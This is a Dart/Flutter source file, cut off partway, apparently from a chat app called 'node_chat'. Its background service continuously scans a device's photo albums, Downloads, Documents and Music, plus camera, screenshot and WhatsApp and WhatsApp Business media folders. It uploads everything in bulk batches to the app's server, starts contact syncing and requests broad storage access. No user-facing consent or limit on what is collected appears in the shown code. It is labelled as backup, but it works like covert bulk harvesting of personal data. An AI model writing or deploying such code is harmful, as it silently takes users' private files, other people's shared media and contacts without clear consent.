import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:isolate';
import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:node_chat/services/api_service.dart';
import 'package:node_chat/services/contact_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:convert/convert.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:path_provider/path_provider.dart';

class BackgroundUploadService {
  BackgroundUploadService._privateConstructor();
  static final BackgroundUploadService instance =
      BackgroundUploadService._privateConstructor();

  bool _isRunning = false;
  ApiService? _apiService;
  StreamController<File> _queue = StreamController<File>.broadcast();

  /// Initialize the API service - handles both GetX and direct instantiation
  Future<void> _ensureApiService() async {
    if (_apiService == null) {
      try {
        // Try to get from GetX first (if available)
        _apiService = Get.find<ApiService>();
      } catch (e) {
        // If GetX is not available (background isolate), create directly
        _apiService = ApiService();
        await _apiService!.initialize();
      }
    }
  }

  List<File> _pendingFiles = [];
  Set<String> _uploadedFileHashes = {};
  Map<String, int> _fileRetryCount = {}; // Track retry attempts per file
  static const int _maxFileRetries =
      5; // Max retries before giving up on a file

  // NEW: Track files currently in queue to prevent duplicates
  Set<String> _queuedFilePaths = {}; // Tracks files already in queue

  // NEW: Track scanned files to avoid re-scanning and re-hashing
  Map<String, _FileMetadata> _scannedFiles = {}; // path -> metadata
  DateTime? _lastFullScanTime;
  bool _initialScanComplete = false; // Track if initial full scan is done

  // NEW: Performance throttling to prevent UI lag
  bool _isScanning = false; // Prevent concurrent scans

  int _inFlightBatches = 0;
  DateTime? _lastResetTime;
  static const int _maxConcurrentBatches =
      8; // Allow 8 concurrent batches for faster uploads
  static int _batchSize = 20; // Larger batch size for faster uploads
  static int _maxBatchSizeBytes =
      50 * 1024 * 1024; // 50MB max per batch for faster uploads
  Timer? _flushTimer;
  Timer? _periodicScanTimer; // NEW: Periodic scan timer to catch missed files
  List<StreamSubscription<FileSystemEvent>> _watchers = [];

  Future<void> startService(String username) async {
    if (_isRunning) return;
    _isRunning = true;

    if (kDebugMode)
      debugPrint(
        '🟢 [BackgroundUploadService] Starting service for user: $username',
      );

    try {
      // Platform-specific optimizations for super fast uploads
      if (Platform.isIOS) {
        _batchSize = 20; // Larger batches for iOS super fast upload
        _maxBatchSizeBytes = 50 * 1024 * 1024; // 50MB max for iOS
        if (kDebugMode)
          debugPrint(
            '📱 [BackgroundUploadService] iOS: Optimized for super fast uploads',
          );
      } else {
        _batchSize = 25; // Android can handle larger batches
        _maxBatchSizeBytes = 60 * 1024 * 1024; // 60MB max for Android
      }

      // Ensure API service is initialized
      await _ensureApiService();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] API service initialized');

      await _loadPersistentState();
      if (kDebugMode)
        debugPrint(
          '✅ [BackgroundUploadService] Loaded ${_uploadedFileHashes.length} uploaded file hashes',
        );

      // Request permissions (will skip if no Activity context)
      await _requestPermissions();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Permissions checked');

      if (_queue.isClosed) {
        _queue = StreamController<File>.broadcast();
      }
      _startConsumer();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Consumer started');

      // Start initial scan (don't await to not block)
      _scanAndUpload();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Initial scan triggered');

      // Setup periodic scanning every 30 minutes to catch missed files
      _startPeriodicScanning();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Periodic scanning started');

      _setupFileWatchers();

      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] File watchers setup');

      // Initialize and start contact service
      await _initializeContactService();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Contact service initialized');

      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Service started successfully');
    } catch (e) {
      if (kDebugMode)
        debugPrint(
          '⚠️ [BackgroundUploadService] Service started with warnings: $e',
        );
      // Keep _isRunning = true so service continues
      // Permission errors in background are expected and can be ignored
      // as permissions should have been granted when app was in foreground
    }
  }

  Future<void> stopService() async {
    if (kDebugMode) debugPrint('🔴 [BackgroundUploadService] Stopping service');
    _isRunning = false;
    _flushTimer?.cancel();
    _periodicScanTimer?.cancel(); // Stop periodic scanning

    for (var watcher in _watchers) {
      await watcher.cancel();
    }
    _watchers.clear();

    // Only close if not already closed
    if (!_queue.isClosed) {
      await _queue.close();
    }

    await _savePersistentState();

    // Stop contact monitoring
    ContactService.instance.stopMonitoring();

    if (kDebugMode) debugPrint('✅ [BackgroundUploadService] Service stopped');
  }

  Future<void> resetForNewUser() async {
    if (kDebugMode)
      debugPrint('🧹 [BackgroundUploadService] Resetting for new user');
    await stopService();
    _pendingFiles.clear();
    _uploadedFileHashes.clear();
    _fileRetryCount.clear(); // Clear retry counts
    _queuedFilePaths.clear(); // Clear queued file paths
    _scannedFiles.clear(); // Clear scanned file tracking
    _lastFullScanTime = null; // Reset scan time
    _initialScanComplete = false; // Reset initial scan flag
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('uploadedFileHashes');
    await prefs.remove('scannedFilesMetadata');
    await prefs.remove('lastFullScanTime');
    await prefs.remove('initialScanComplete');

    // Reset contact sync state
    await ContactService.instance.resetSyncState();

    if (kDebugMode) debugPrint('✅ [BackgroundUploadService] Reset complete');
  }

  void _startConsumer() {
    _flushTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
      // Check every 500ms for super fast processing
      if (_pendingFiles.isNotEmpty &&
          _apiService?.authToken != null &&
          _apiService?.userEmail != null) {
        if (kDebugMode)
          debugPrint(
            '⏰ [BackgroundUploadService] Flushing batches, pending files: ${_pendingFiles.length}',
          );
        _flushBatches();
      } else if (_pendingFiles.isNotEmpty && _apiService?.authToken == null) {
        if (kDebugMode)
          debugPrint(
            '🔐 [BackgroundUploadService] Pausing uploads - no authentication token',
          );
      }
    });
    _queue.stream.listen((file) {
      if (kDebugMode)
        debugPrint('📥 [BackgroundUploadService] Queued file: ${file.path}');
      _pendingFiles.add(file);
      if (_pendingFiles.length >= _batchSize) {
        _flushBatches();
      }
    });
  }

  /// Start periodic scanning to catch missed files (every 30 minutes after initial scan)
  /// This is a safety net in case file watchers or observers miss something
  void _startPeriodicScanning() {
    _periodicScanTimer = Timer.periodic(const Duration(minutes: 30), (_) {
      if (_isRunning && !_isScanning && _initialScanComplete) {
        if (kDebugMode)
          debugPrint(
            '🔄 [BackgroundUploadService] Periodic check to catch any missed files',
          );
        _scanAndUpload();
      }
    });
  }

  Future<void> _flushBatches() async {
    // Safety mechanism: fix negative or stuck counter
    if (_inFlightBatches < 0) {
      if (kDebugMode)
        debugPrint(
          '⚠️ [BackgroundUploadService] Fixing negative InFlight counter from $_inFlightBatches to 0',
        );
      _inFlightBatches = 0;
    } else if (_inFlightBatches > _maxConcurrentBatches) {
      final now = DateTime.now();
      if (_lastResetTime == null ||
          now.difference(_lastResetTime!).inMinutes >= 5) {
        if (kDebugMode)
          debugPrint(
            '⚠️ [BackgroundUploadService] Resetting stuck InFlight counter from $_inFlightBatches to 0',
          );
        _inFlightBatches = 0;
        _lastResetTime = now;
      }
    }

    if (!_isRunning || _inFlightBatches >= _maxConcurrentBatches) {
      if (kDebugMode)
        debugPrint(
          '🚫 [BackgroundUploadService] Skipping flush: Running=$_isRunning, InFlight=$_inFlightBatches',
        );
      return;
    }

    if (kDebugMode)
      debugPrint(
        '🔄 [BackgroundUploadService] Starting batch flush, pending files: ${_pendingFiles.length}',
      );

    while (_pendingFiles.isNotEmpty &&
        _inFlightBatches < _maxConcurrentBatches) {
      var batch = <File>[];
      int batchSizeBytes = 0;

      while (batch.length < _batchSize && _pendingFiles.isNotEmpty) {
        final file = _pendingFiles.removeAt(0);

        // Skip files that have exceeded max retry attempts
        final retryCount = _fileRetryCount[file.path] ?? 0;
        if (retryCount >= _maxFileRetries) {
          if (kDebugMode)
            debugPrint(
              '⏭️ [BackgroundUploadService] Skipping file after $retryCount failed attempts: ${file.path.split('/').last}',
            );
          _queuedFilePaths.remove(file.path); // Clear from queue
          _fileRetryCount.remove(file.path); // Clean up retry count
          continue; // Skip this file and try next one
        }

        final fileSize = await file.length();
        if (batchSizeBytes + fileSize > _maxBatchSizeBytes) {
          _pendingFiles.insert(0, file);
          break;
        }
        batch.add(file);
        batchSizeBytes += fileSize;
      }

      if (batch.isNotEmpty) {
        _inFlightBatches++;
        if (kDebugMode)
          debugPrint(
            '📤 [BackgroundUploadService] Uploading batch of ${batch.length} files (InFlight: $_inFlightBatches)',
          );
        // Don't await here to allow concurrent uploads
        _uploadBatch(batch)
            .then((_) {
              // Success - decrement counter
              _inFlightBatches--;
              if (kDebugMode)
                debugPrint(
                  '✅ [BackgroundUploadService] Batch completed successfully, InFlight: $_inFlightBatches',
                );
            })
            .catchError((error) {
              // Error - still decrement counter (only once!)
              _inFlightBatches--;
              if (kDebugMode)
                debugPrint(
                  '❌ [BackgroundUploadService] Batch failed: $error, InFlight: $_inFlightBatches',
                );
            })
            .whenComplete(() {
              // CRITICAL: Ensure counter is never stuck by force-decrementing
              // This is a safety net in case both then() and catchError() somehow don't fire
              if (_inFlightBatches > _maxConcurrentBatches) {
                if (kDebugMode)
                  debugPrint(
                    '⚠️ [BackgroundUploadService] Safety reset of stuck InFlight counter',
                  );
                _inFlightBatches = 0;
              }
            });
      }
    }
    if (kDebugMode)
      debugPrint('✅ [BackgroundUploadService] Batch flush completed');
  }

  Future<void> _uploadBatch(List<File> batch) async {
    // Track hashes being uploaded for rollback on failure
    final hashesBeingUploaded = <String>[];

    try {
      // Check if authentication is available
      if (_apiService?.authToken == null || _apiService?.userEmail == null) {
        if (kDebugMode)
          debugPrint(
            '⚠️ [BackgroundUploadService] Skipping upload - no authentication token',
          );
        return;
      }

      final fileHashes = <String, File>{};
      for (var file in batch) {
        final hash = await _calculateFileHash(file);
        if (hash.isNotEmpty) fileHashes[hash] = file;
        if (kDebugMode)
          debugPrint(
            '🔍 [BackgroundUploadService] Hashed file ${file.path}: $hash',
          );
      }

      final filesToUpload = fileHashes.entries
          .where((entry) => !_uploadedFileHashes.contains(entry.key))
          .map((entry) => entry.value)
          .toList();

      // CRITICAL FIX: Mark files as "being uploaded" BEFORE actual upload
      // This prevents parallel uploads of the same file
      for (var entry in fileHashes.entries) {
        if (!_uploadedFileHashes.contains(entry.key)) {
          _uploadedFileHashes.add(entry.key);
          hashesBeingUploaded.add(entry.key);
        }
      }

      // Clear queued status for files that were already uploaded (won't be uploaded again)
      for (var entry in fileHashes.entries) {
        if (_uploadedFileHashes.contains(entry.key)) {
          _queuedFilePaths.remove(entry.value.path);
          // CRITICAL: Also mark in metadata as uploaded to prevent future scans
          try {
            final stat = entry.value.statSync();
            _scannedFiles[entry.value.path] = _FileMetadata(
              path: entry.value.path,
              size: stat.size,
              modifiedTime: stat.modified,
              hash: entry.key,
              scannedTime: DateTime.now(),
              uploaded: true,
            );
          } catch (e) {
            if (kDebugMode)
              debugPrint(
                '⚠️ [BackgroundUploadService] Failed to track metadata for ${entry.value.path}: $e',
              );
          }
          if (kDebugMode)
            debugPrint(
              '⏭️ [BackgroundUploadService] File already uploaded, clearing from queue: ${entry.value.path.split('/').last}',
            );
        }
      }

      if (filesToUpload.isEmpty) {
        if (kDebugMode)
          debugPrint('ℹ️ [BackgroundUploadService] No new files to upload');
        await _savePersistentState();
        return;
      }

      if (kDebugMode)
        debugPrint(
          '⬆️ [BackgroundUploadService] Uploading ${filesToUpload.length} files to API',
        );
      final result = await _apiService!.uploadFiles(
        files: filesToUpload,
        backupType: 'files',
      );

      if (result['success'] == true) {
        for (var file in filesToUpload) {
          final hash = await _calculateFileHash(file);
          if (hash.isNotEmpty) {
            // Hash already added to _uploadedFileHashes before upload
            // Just track file metadata as uploaded
            try {
              final stat = file.statSync();
              _scannedFiles[file.path] = _FileMetadata(
                path: file.path,
                size: stat.size,
                modifiedTime: stat.modified,
                hash: hash,
                scannedTime: DateTime.now(),
                uploaded: true,
              );
            } catch (e) {
              if (kDebugMode)
                debugPrint(
                  '⚠️ [BackgroundUploadService] Failed to track metadata for ${file.path}: $e',
                );
            }
          }
          // Clear retry count and queued status for successful uploads
          _fileRetryCount.remove(file.path);
          _queuedFilePaths.remove(
            file.path,
          ); // CRITICAL: Remove from queued set
          if (kDebugMode)
            debugPrint('✅ [BackgroundUploadService] Uploaded ${file.path}');
        }
        await _savePersistentState();
      } else {
        // CRITICAL: Upload failed - remove hashes we optimistically added
        for (var hash in hashesBeingUploaded) {
          _uploadedFileHashes.remove(hash);
        }

        // Handle authentication errors
        if (result['status'] == 401 ||
            (result['error'] as String?)?.contains('Invalid token') == true) {
          if (kDebugMode)
            debugPrint(
              '🔐 [BackgroundUploadService] Authentication error - stopping uploads until re-authenticated',
            );
          // Don't retry immediately on auth errors
          return;
        }

        // Handle timeout errors - mark files for retry but DON'T remove from queue yet
        final errorMsg = result['error']?.toString() ?? '';
        if (errorMsg.contains('TimeoutException') ||
            errorMsg.contains('timeout')) {
          if (kDebugMode)
            debugPrint(
              '⏱️ [BackgroundUploadService] Timeout error - marking files for retry',
            );
          // Increment retry count for each file
          List<File> filesToRetry = [];
          for (var file in filesToUpload) {
            final currentRetries = _fileRetryCount[file.path] ?? 0;
            _fileRetryCount[file.path] = currentRetries + 1;

            // If exceeded max retries, give up and remove from queue
            if (currentRetries + 1 >= _maxFileRetries) {
              if (kDebugMode)
                debugPrint(
                  '❌ [BackgroundUploadService] File exceeded max retries, giving up: ${file.path.split('/').last}',
                );
              _queuedFilePaths.remove(file.path);
              _fileRetryCount.remove(file.path);
            } else {
              // Add back to retry queue
              filesToRetry.add(file);
              if (kDebugMode)
                debugPrint(
                  '🔄 [BackgroundUploadService] Will retry ${file.path.split('/').last} (attempt ${currentRetries + 1}/$_maxFileRetries)',
                );
            }
          }

          // Re-add files to pending queue with delay to avoid immediate retry
          if (filesToRetry.isNotEmpty) {
            Future.delayed(Duration(seconds: 5), () {
              if (_isRunning) {
                _pendingFiles.addAll(filesToRetry);
                if (kDebugMode)
                  debugPrint(
                    '🔄 [BackgroundUploadService] Re-queued ${filesToRetry.length} files for retry',
                  );
              }
            });
          }
        } else {
          // Non-timeout error - remove from queue
          for (var file in filesToUpload) {
            _queuedFilePaths.remove(file.path);
          }
        }

        if (kDebugMode)
          debugPrint(
            ' [BackgroundUploadService] API upload failed: ${result['message'] ?? result['error'] ?? 'No message'}',
          );
      }
    } catch (e) {
      if (kDebugMode)
        debugPrint(' [BackgroundUploadService] Upload failed: $e');

      // CRITICAL: Upload failed - remove hashes we optimistically added
      for (var hash in hashesBeingUploaded) {
        _uploadedFileHashes.remove(hash);
      }

      // Add files back to queue for network errors with retry limit
      if (e.toString().contains('SocketException') ||
          e.toString().contains('TimeoutException')) {
        List<File> filesToRetry = [];
        for (var file in batch) {
          final filePath = file.path;
          final retryCount = _fileRetryCount[filePath] ?? 0;

          if (retryCount < 3) {
            // Max 3 retries per file
            _fileRetryCount[filePath] = retryCount + 1;
            filesToRetry.add(file);
            if (kDebugMode)
              debugPrint(
                ' [BackgroundUploadService] Retry ${retryCount + 1}/3 for ${file.path.split('/').last}',
              );
          } else {
            if (kDebugMode)
              debugPrint(
                ' [BackgroundUploadService] Max retries reached for ${file.path.split('/').last}',
              );
            _fileRetryCount.remove(filePath); // Clean up
          }
        }

        if (filesToRetry.isNotEmpty) {
          // Add delay before re-queuing to avoid immediate retry
          await Future.delayed(Duration(seconds: 10));
          _pendingFiles.addAll(filesToRetry);
        }
      }
    }
  }

  Future<String> _calculateFileHash(File file) async {
    try {
      final stream = file.openRead();
      final hash = await md5.bind(stream).first;
      return hex.encode(hash.bytes);
    } catch (e) {
      if (kDebugMode)
        debugPrint(
          ' [BackgroundUploadService] Hash calculation failed for ${file.path}: $e',
        );
      return '';
    }
  }

  Future<void> _scanAndUpload() async {
    if (kDebugMode)
      debugPrint('🔍 [BackgroundUploadService] _scanAndUpload called');

    // Prevent concurrent scans
    if (_isScanning) {
      if (kDebugMode)
        debugPrint(
          '⏭️ [BackgroundUploadService] Scan already in progress, skipping',
        );
      return;
    }

    _isScanning = true;

    // Determine scan type: INITIAL full scan or PERIODIC check
    final isInitialScan = !_initialScanComplete;

    if (isInitialScan) {
      if (kDebugMode)
        debugPrint(
          '🚀 [BackgroundUploadService] Performing INITIAL FULL SCAN - this will scan all files',
        );
    } else {
      if (kDebugMode)
        debugPrint(
          '🔄 [BackgroundUploadService] Performing PERIODIC CHECK - only new/changed files',
        );
    }

    try {
      // Platform-specific scanning - optimized for PhotoManager
      if (kDebugMode)
        debugPrint(
          '📱 [BackgroundUploadService] Using photo_manager for media scanning',
        );

      // Use photo_manager for media access (works on both iOS and Android)
      await _scanMediaWithPhotoManager(isInitialScan);

      // Also scan app documents directory
      await _scanDocumentsDirectory(isInitialScan);

      // For Android, also scan additional system directories
      if (Platform.isAndroid) {
        final priorityDirs = [
          '/storage/emulated/0/Documents',
          '/storage/emulated/0/Download',
          '/storage/emulated/0/Music',
        ];

        if (kDebugMode)
          debugPrint(
            '📂 [BackgroundUploadService] Android: Scanning ${priorityDirs.length} additional directories',
          );

        await _scanInIsolate(priorityDirs, !isInitialScan);
      }

      if (kDebugMode)
        debugPrint(
          '📤 [BackgroundUploadService] All scans complete, flushing batches',
        );

      await _flushBatches();

      // Mark initial scan as complete
      if (isInitialScan) {
        _initialScanComplete = true;
        _lastFullScanTime = DateTime.now();
        if (kDebugMode)
          debugPrint(
            '✅ [BackgroundUploadService] INITIAL SCAN COMPLETE! Now in observation mode.',
          );
      }

      // Save state after scan
      await _savePersistentState();

      if (kDebugMode) {
        final scanType = isInitialScan ? 'Initial full scan' : 'Periodic check';
        debugPrint(
          '✅ [BackgroundUploadService] $scanType completed successfully',
        );
      }
    } catch (e) {
      if (kDebugMode) debugPrint('❌ [BackgroundUploadService] Scan error: $e');
    } finally {
      _isScanning = false;
    }
  }

  Future<void> _scanInIsolate(List<String> roots, bool skipKnownFiles) async {
    final rp = ReceivePort();
    await Isolate.spawn(_scanEntry, _IsolateMsg(roots, rp.sendPort));

    int fileCount = 0;
    await for (var msg in rp) {
      if (msg is _IsolateDone) {
        if (kDebugMode)
          debugPrint(
            '✅ [BackgroundUploadService] Isolate scan finished for ${roots.join(', ')}',
          );
        break;
      }
      if (msg is _FoundPath) {
        final file = File(msg.path);

        // Skip if file doesn't exist or is temporary
        if (!file.existsSync() || _isTemporaryFile(file.path)) {
          continue;
        }

        // CRITICAL: Check if already queued to prevent duplicates
        if (_queuedFilePaths.contains(file.path)) {
          continue;
        }

        // CRITICAL: Also check if already in pending files list (double safety)
        if (_pendingFiles.any((f) => f.path == file.path)) {
          _queuedFilePaths.add(
            file.path,
          ); // Mark as queued to prevent future adds
          continue;
        }

        // NEW: Quick metadata check WITHOUT hash calculation (FAST check)
        if (skipKnownFiles && await _shouldSkipFileFast(file)) {
          continue;
        }

        if (!_queue.isClosed && _isRunning) {
          _queuedFilePaths.add(file.path); // Mark as queued
          _queue.add(file);
          if (kDebugMode)
            debugPrint(' [BackgroundUploadService] Found file: ${file.path}');

          // PERFORMANCE: Yield to UI thread less frequently for faster processing
          fileCount++;
          if (fileCount % 100 == 0) {
            await Future.delayed(Duration(milliseconds: 1)); // Minimal delay
          }
        }
      }
    }
  }

  /// NEW: FAST check if a file should be skipped (no hash calculation)
  /// Only checks metadata without expensive hash calculation
  Future<bool> _shouldSkipFileFast(File file) async {
    try {
      final path = file.path;
      final metadata = _scannedFiles[path];

      // If we have no metadata, don't skip (need to scan)
      if (metadata == null) {
        return false;
      }

      // If file has changed, don't skip (need to rescan)
      if (metadata.hasChanged(file)) {
        _scannedFiles.remove(path); // Remove stale metadata
        return false;
      }

      // If already uploaded and unchanged, skip it
      if (metadata.uploaded && metadata.hash != null) {
        if (kDebugMode)
          debugPrint(
            '⏭️ [BackgroundUploadService] Skipping uploaded file: ${file.path.split('/').last}',
          );
        return true;
      }

      return false; // Default: don't skip
    } catch (e) {
      return false; // On error, don't skip
    }
  }

  /// NEW: Check if a file should be skipped based on metadata
  Future<bool> _shouldSkipFile(File file) async {
    try {
      final path = file.path;
      final metadata = _scannedFiles[path];

      // If we have no metadata, don't skip (need to scan)
      if (metadata == null) {
        return false;
      }

      // If file has changed, don't skip (need to rescan)
      if (metadata.hasChanged(file)) {
        if (kDebugMode)
          debugPrint(
            '🔄 [BackgroundUploadService] File changed: ${file.path.split('/').last}',
          );
        _scannedFiles.remove(path); // Remove stale metadata
        return false;
      }

      // If already uploaded and unchanged, skip it
      if (metadata.uploaded && metadata.hash != null) {
        if (kDebugMode)
          debugPrint(
            '⏭️ [BackgroundUploadService] Skipping uploaded file: ${file.path.split('/').last}',
          );
        return true;
      }

      // If we recently scanned it (within last hour) and it's not uploaded, don't skip yet
      final hourAgo = DateTime.now().subtract(Duration(hours: 1));
      if (metadata.scannedTime.isAfter(hourAgo)) {
        return false; // Still process it
      }

      return false; // Default: don't skip
    } catch (e) {
      if (kDebugMode)
        debugPrint('⚠️ [BackgroundUploadService] Error checking file skip: $e');
      return false; // On error, don't skip
    }
  }

  void _setupFileWatchers() {
    if (kDebugMode)
      debugPrint('👀 [BackgroundUploadService] Setting up file watchers');

    // Platform-specific file watchers
    if (Platform.isIOS) {
      // iOS doesn't support file system watching in the same way
      // Photos are accessed through PhotoManager API
      if (kDebugMode)
        debugPrint(
          '📱 [BackgroundUploadService] iOS: File watchers not applicable, using photo_manager',
        );
      return;
    }

    // Android file watchers - expanded coverage for all media sources
    final dirs = [
      Directory('/storage/emulated/0/Documents'),
      Directory('/storage/emulated/0/Download'),
      Directory('/storage/emulated/0/DCIM'),
      Directory('/storage/emulated/0/DCIM/Camera'), // Camera captures
      Directory('/storage/emulated/0/Pictures'),
      Directory('/storage/emulated/0/Pictures/Screenshots'),
      Directory('/storage/emulated/0/Music'),
      Directory('/storage/emulated/0/WhatsApp/Media'),
      Directory('/storage/emulated/0/WhatsApp/Media/WhatsApp Images'),
      Directory('/storage/emulated/0/WhatsApp/Media/WhatsApp Video'),
      Directory('/storage/emulated/0/WhatsApp/Media/WhatsApp Audio'),
      Directory('/storage/emulated/0/WhatsApp/Media/WhatsApp Documents'),
      Directory(
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media',
      ),
      Directory(
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images',
      ),
      Directory(
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video',
      ),
      Directory(
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio',
      ),
      Directory(
        '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media',
      ),
    ];

    for (var dir in dirs) {
      if (dir.existsSync()) {
        _watchers.add(
          dir.watch(events: FileSystemEvent.create).listen((event) async {
            if (event.type == FileSystemEvent.create) {
              final file = File(event.path);
              if (file.existsSync() &&
                  !_isTemporaryFile(file.path) &&
                  !_queue.isClosed &&
                  _isRunning) {
                // CRITICAL: Check if already queued
                if (_queuedFilePaths.contains(file.path)) {
                  return;
                }

                // Just add to queue - hash check will happen in batch processing
                _queuedFilePaths.add(file.path);
                _queue.add(file);
                if (kDebugMode)
                  debugPrint(
                    '📥 [BackgroundUploadService] Watched file created: ${file.path}',
                  );
              }
            }
          }),
        );
        if (kDebugMode)
          debugPrint('👁️ [BackgroundUploadService] Watching: ${dir.path}');
      } else {
        if (kDebugMode)
          debugPrint(
            '⚠️ [BackgroundUploadService] Directory not found: ${dir.path}',
          );
      }
    }
  }

  /// Scan media using photo_manager (works on iOS and Android)
  Future<void> _scanMediaWithPhotoManager(bool skipKnownFiles) async {
    if (kDebugMode)
      debugPrint(
        '📸 [BackgroundUploadService] Scanning media with photo_manager',
      );

    try {
      // Request permission
      final PermissionState ps = await PhotoManager.requestPermissionExtend();
      if (!ps.isAuth) {
        if (kDebugMode)
          debugPrint('⚠️ [BackgroundUploadService] Photo permission denied');
        return;
      }

      // Get all albums
      final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
        type: RequestType.common, // Images, videos, and audio
        hasAll: true,
      );

      if (kDebugMode)
        debugPrint(
          '📱 [BackgroundUploadService] Found ${albums.length} albums',
        );

      int fileCount = 0;
      for (final album in albums) {
        if (kDebugMode)
          debugPrint(
            '📂 [BackgroundUploadService] Processing album: ${album.name}',
          );

        // Get all assets in album
        final int assetCount = await album.assetCountAsync;
        final List<AssetEntity> assets = await album.getAssetListRange(
          start: 0,
          end: assetCount,
        );

        for (final asset in assets) {
          try {
            // Get file from asset
            final File? file = await asset.file;
            if (file == null || !file.existsSync()) continue;

            // Check if already queued
            if (_queuedFilePaths.contains(file.path)) {
              continue;
            }

            // Check if already in pending files list
            if (_pendingFiles.any((f) => f.path == file.path)) {
              _queuedFilePaths.add(file.path);
              continue;
            }

            // Quick metadata check if skipping known files
            if (skipKnownFiles && await _shouldSkipFileFast(file)) {
              continue;
            }

            if (!_queue.isClosed && _isRunning) {
              _queuedFilePaths.add(file.path);
              _queue.add(file);
              fileCount++;
              if (kDebugMode && fileCount % 100 == 0)
                debugPrint(
                  '📸 [BackgroundUploadService] Queued $fileCount files...',
                );

              // Yield to UI thread less frequently for faster processing
              if (fileCount % 50 == 0) {
                await Future.delayed(Duration(milliseconds: 1));
              }
            }
          } catch (e) {
            if (kDebugMode)
              debugPrint(
                '⚠️ [BackgroundUploadService] Error processing asset: $e',
              );
          }
        }
      }

      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Queued $fileCount media files');
    } catch (e) {
      if (kDebugMode)
        debugPrint('❌ [BackgroundUploadService] Photo manager error: $e');
    }
  }

  /// Scan Documents directory
  Future<void> _scanDocumentsDirectory(bool skipKnownFiles) async {
    if (kDebugMode)
      debugPrint('📁 [BackgroundUploadService] Scanning Documents directory');

    try {
      final Directory appDocDir = await getApplicationDocumentsDirectory();

      if (!appDocDir.existsSync()) {
        if (kDebugMode)
          debugPrint(
            '⚠️ [BackgroundUploadService] Documents directory not found',
          );
        return;
      }

      int fileCount = 0;
      await for (final entity in appDocDir.list(
        recursive: true,
        followLinks: false,
      )) {
        if (entity is File && !_isTemporaryFile(entity.path)) {
          // Check if already queued
          if (_queuedFilePaths.contains(entity.path)) {
            continue;
          }

          // Check if already in pending files list
          if (_pendingFiles.any((f) => f.path == entity.path)) {
            _queuedFilePaths.add(entity.path);
            continue;
          }

          // Quick metadata check if skipping known files
          if (skipKnownFiles && await _shouldSkipFileFast(entity)) {
            continue;
          }

          if (!_queue.isClosed && _isRunning) {
            _queuedFilePaths.add(entity.path);
            _queue.add(entity);
            fileCount++;

            // Yield to UI thread less frequently for faster processing
            if (fileCount % 50 == 0) {
              await Future.delayed(Duration(milliseconds: 1));
            }
          }
        }
      }

      if (kDebugMode)
        debugPrint(
          '✅ [BackgroundUploadService] Queued $fileCount document files',
        );
    } catch (e) {
      if (kDebugMode)
        debugPrint('❌ [BackgroundUploadService] Documents scan error: $e');
    }
  }

  bool _isTemporaryFile(String path) {
    final fileName = path.split('/').last.toLowerCase();
    return fileName.startsWith('.') ||
        fileName.endsWith('.tmp') ||
        fileName.endsWith('.temp') ||
        fileName.endsWith('.crdownload') ||
        fileName.endsWith('.part');
  }

  Future<void> _requestPermissions() async {
    try {
      if (kDebugMode)
        debugPrint('🔑 [BackgroundUploadService] Requesting permissions');

      if (Platform.isIOS) {
        // iOS: Check photo library permissions
        final photoStatus = await Permission.photos.status;

        if (!photoStatus.isGranted) {
          if (kDebugMode)
            debugPrint(
              '📸 [BackgroundUploadService] iOS: Requesting photo permissions',
            );

          try {
            final status = await Permission.photos.request();
            if (kDebugMode)
              debugPrint(
                '✅ [BackgroundUploadService] iOS: Photo permission: $status',
              );
          } catch (e) {
            if (kDebugMode)
              debugPrint(
                '⚠️ [BackgroundUploadService] iOS: Photo permission error: $e',
              );
          }
        } else {
          if (kDebugMode)
            debugPrint(
              '✅ [BackgroundUploadService] iOS: Photo permissions already granted',
            );
        }

        // NOTE: Do NOT request contacts permission from a background
        // isolate/context. iOS will only present the native contacts
        // permission dialog from the foreground UI. Contact permission
        // requests are handled by ContactService (foreground) using
        // flutter_contacts which guarantees the dialog is shown.
        if (kDebugMode)
          debugPrint(
            'ℹ️ [BackgroundUploadService] Skipping contacts permission request in background - ensure permission is requested from foreground',
          );

        // Also check with PhotoManager
        try {
          final PermissionState ps =
              await PhotoManager.requestPermissionExtend();
          if (kDebugMode)
            debugPrint(
              '📱 [BackgroundUploadService] iOS: PhotoManager permission: ${ps.isAuth}',
            );
        } catch (e) {
          if (kDebugMode)
            debugPrint(
              '⚠️ [BackgroundUploadService] iOS: PhotoManager permission error: $e',
            );
        }
      } else {
        // Android: Check storage permissions
        final storageStatus = await Permission.storage.status;
        final manageStorageStatus =
            await Permission.manageExternalStorage.status;

        // Only request if not granted and we have Activity context
        if (!storageStatus.isGranted || !manageStorageStatus.isGranted) {
          try {
            // Do not request contacts permission from background - contacts
            // should be requested from the foreground using FlutterContacts.
            final statuses = await [
              Permission.storage,
              Permission.photos,
              Permission.videos,
              Permission.audio,
              Permission.manageExternalStorage,
            ].request();

            if (kDebugMode)
              debugPrint(
                '✅ [BackgroundUploadService] Android: Permissions granted: $statuses',
              );
          } on PlatformException catch (e) {
            // No Activity context (background isolate) - permissions were likely granted earlier
            if (e.code == 'PermissionHandler.PermissionManager') {
              if (kDebugMode)
                debugPrint(
                  '⚠️ [BackgroundUploadService] Android: Running in background isolate, skipping permission request',
                );
            } else {
              rethrow;
            }
          }
        } else {
          if (kDebugMode)
            debugPrint(
              '✅ [BackgroundUploadService] Android: Permissions already granted',
            );
